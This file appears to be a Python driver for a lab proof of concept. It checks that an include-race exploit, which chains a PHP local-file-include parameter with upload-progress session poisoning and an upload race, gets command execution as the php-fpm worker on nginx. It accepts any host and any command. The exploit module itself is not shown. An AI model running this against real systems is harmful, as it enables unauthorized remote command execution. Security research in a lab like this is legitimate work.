#!/usr/bin/env python3
"""Driver for include_race.py: lands `id` (uid=www-data) through a stock nginx +
php-fpm front using only one includable GET param + the upload-progress poison +
file-part storm race.

Bring up the lab:
    docker compose -f docker-compose.fpm-avenues.yml -p p2s-incrace --profile incrace up -d --build
    python3 -I poc/routes/verify_include_race.py --port 8120
"""

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import include_race as ir  # noqa: E402


def main(argv):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8120)
    ap.add_argument("--base", default="/index.php")
    ap.add_argument("--param", default="page")
    ap.add_argument("--save-path", default="/var/sess")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--attempts", type=int, default=25)
    args = ap.parse_args(argv)

    print(f"=== include-race verify  http://{args.host}:{args.port}{args.base} ===")
    ok, output, hit = ir.run(
        args.host, args.port, args.cmd, base=args.base, param=args.param,
        save_paths=[args.save_path], attempts=args.attempts, verbose=True,
    )

    if not ok:
        print("\nRESULT: FAIL - no command execution landed")
        return 1

    uid_ok = "uid=" in (output or "")
    print(f"\nRESULT: PASS - command executed as the fpm worker")
    print(f"  output   : {(output or '').strip()!r}")
    print(f"  hit      : {hit}")
    print(f"  uid      : {uid_ok}")
    return 0 if uid_ok else 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
